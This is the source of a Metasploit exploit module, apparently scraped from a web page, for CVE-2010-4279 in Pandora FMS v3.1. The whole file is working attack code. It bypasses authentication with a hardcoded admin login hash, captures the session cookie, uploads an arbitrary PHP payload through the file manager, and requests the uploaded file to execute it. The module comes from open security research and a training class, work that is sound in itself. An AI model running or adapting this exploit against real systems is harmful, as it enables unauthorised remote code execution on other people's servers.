# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Pandora v3.1 Auth Bypass and Arbitrary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits an authentication bypass vulnerability in Pandora v3.1 as
        disclosed by Juan Galiana Lara. It also integrates with the built-in pandora
        upload which allows a user to upload arbitrary files to the &#039;/images/&#039; directory.

        This module was created as an exercise in the Metasploit Mastery Class at Blackhat
        that was facilitated by egypt and mubix.

      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Juan Galiana Lara&#039;,                         # Vulnerability discovery
          &#039;Raymond Nunez <rcnunez[at]upd.edu.ph>&#039;,     # Metasploit module
          &#039;Elizabeth Loyola <ecloyola[at]upd.edu.ph>&#039;, # Metasploit module
          &#039;Fr330wn4g3 <Fr330wn4g3[at]gmail.com>&#039;,      # Metasploit module
          &#039;_flood <freshbones[at]gmail.com>&#039;,          # Metasploit module
          &#039;mubix <mubix[at]room362.com>&#039;,              # Auth bypass and file upload
          &#039;egypt <egypt[at]metasploit.com>&#039;,           # Auth bypass and file upload
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2010-4279&#039;],
          [&#039;OSVDB&#039;,   &#039;69549&#039;],
          [&#039;BID&#039;,   &#039;45112&#039;]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Nov 30 2010",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/pandora_console/&#039;]),
      ], self.class)
  end

  def check

    base  = target_uri.path

    # retrieve software version from login page
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(base, &#039;index.php&#039;)
      })
      if res and res.code == 200
        #Tested on v3.1 Build PC100609 and PC100608
        if res.body.include?("v3.1 Build PC10060")
          return Exploit::CheckCode::Appears
        elsif res.body.include?("Pandora")
          return Exploit::CheckCode::Detected
        end
      end
      return Exploit::CheckCode::Safe
    rescue ::Rex::ConnectionError
      print_error("#{peer} - Connection failed")
    end
    return Exploit::CheckCode::Unknown

  end

  # upload a payload using the pandora built-in file upload
  def upload(base, file, cookies)
    data = Rex::MIME::Message.new
    data.add_part(file, &#039;application/octet-stream&#039;, nil, "form-data; name=\"file\"; filename=\"#{@fname}\"")
    data.add_part("Go", nil, nil, &#039;form-data; name="go"&#039;)
    data.add_part("images", nil, nil, &#039;form-data; name="directory"&#039;)
    data.add_part("1", nil, nil, &#039;form-data; name="upload_file"&#039;)
    data_post = data.to_s
    data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(base, &#039;index.php&#039;),
      &#039;cookie&#039;  => cookies,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;vars_get&#039; => {
        &#039;sec&#039;  => &#039;gsetup&#039;,
        &#039;sec2&#039; => &#039;godmode/setup/file_manager&#039;,
      },
      &#039;data&#039;    => data_post
    })

    register_files_for_cleanup(@fname)
    return res
  end

  def exploit

    base   = target_uri.path
    @fname = "#{rand_text_numeric(7)}.php"
    cookies = ""

    # bypass authentication and get session cookie
    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(base, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;loginhash_data&#039;  => &#039;21232f297a57a5a743894a0e4a801fc3&#039;,
        &#039;loginhash_user&#039; => &#039;admin&#039;,
        &#039;loginhash&#039; => &#039;1&#039;,
      },
    })

    # fix if logic
    if res and res.code == 200
      if res.body.include?("Logout")
        cookies = res.get_cookies
        print_status("Login Bypass Successful")
        print_status("cookie monster = " + cookies)
      else
        fail_with(Exploit::Failure::NotVulnerable, "Login Bypass Failed")
      end
    end

    # upload PHP payload to images/[fname]
    print_status("#{peer} - Uploading PHP payload (#{payload.encoded.length} bytes)")
    php    = %Q|<?php #{payload.encoded} ?>|
    begin
      res = upload(base, php, cookies)
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{peer} - Connection failed")
    end

    if res and res.code == 200
      print_good("#{peer} - File uploaded successfully")
    else
      fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Uploading PHP payload failed")
    end

    # retrieve and execute PHP payload
    print_status("#{peer} - Executing payload (images/#{@fname})")
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(base, &#039;images&#039;, "#{@fname}")
      }, 1)
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{peer} - Connection failed")
    end

  end
end

